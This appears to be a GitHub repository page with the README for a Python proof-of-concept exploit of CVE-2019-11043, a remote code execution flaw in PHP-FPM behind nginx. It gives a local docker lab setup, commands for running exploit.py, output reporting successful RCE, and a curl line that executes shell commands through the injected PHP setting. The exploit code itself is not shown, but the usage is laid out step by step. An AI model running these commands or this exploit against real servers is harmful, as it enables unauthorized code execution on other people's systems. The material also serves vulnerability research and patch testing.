# CVE-2019-11043

(PoC) Python version of CVE-2019-11043 exploit by neex

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/theMiddleBlue](https://github.com/theMiddleBlue) |
| Url      | [https://github.com/theMiddleBlue/CVE-2019-11043](https://github.com/theMiddleBlue/CVE-2019-11043)                                               |
| Stars    | 145                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# PoC CVE-2019-11043
A Python version of the CVE-2019-11043 exploit https://github.com/neex/phuip-fpizdam<br>
This PoC is still a draft, please use the exploit written by [@neex](https://github.com/neex/)<br>
Vulnerability Analysis: https://paper.seebug.org/1064/

## PoC Setup
Just run docker compose to bring up nginx and php-fpm:

```bash
# docker-compose up -d
Creating network "cve-2019-11043-git_app_net" with driver "bridge"
Creating php   ... done
Creating nginx ... done
```

if you wish to read php-fpm logs, you could run:
```bash
docker logs --tail 10 --follow php
```

## Exploit

```bash
# python3 exploit.py --url http://localhost/index.php
[*] QSL candidate: 1752, 1757, 1762
[*] Target seems vulnerable: PHPSESSID=05b156ea034b903de6624f09c513541c; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://localhost/index.php?a=bin/ls+/
```

If you want to check the vulnerability only, skipping the exploit:
```bash
python3 exploit.py --url http://localhost/index.php --skip-rce
#...
python3 exploit.py --url http://localhost/index.php --reset
```

You can try to kill php-fpm process and reset all injected PHP settings with `--reset`:
```bash
python3 exploit.py --url http://localhost/index.php --reset
```

## Video PoC
https://twitter.com/Menin_TheMiddle/status/1188776386569355265



## Get the content

```
git clone https://github.com/theMiddleBlue/CVE-2019-11043
cd CVE-2019-11043
```

{% embed url="https://github.com/theMiddleBlue/CVE-2019-11043" %}

<figure><img src="https://avatars.githubusercontent.com/u/4454961?v=4" alt=""><figcaption><p>theMiddleBlue</p></figcaption></figure>
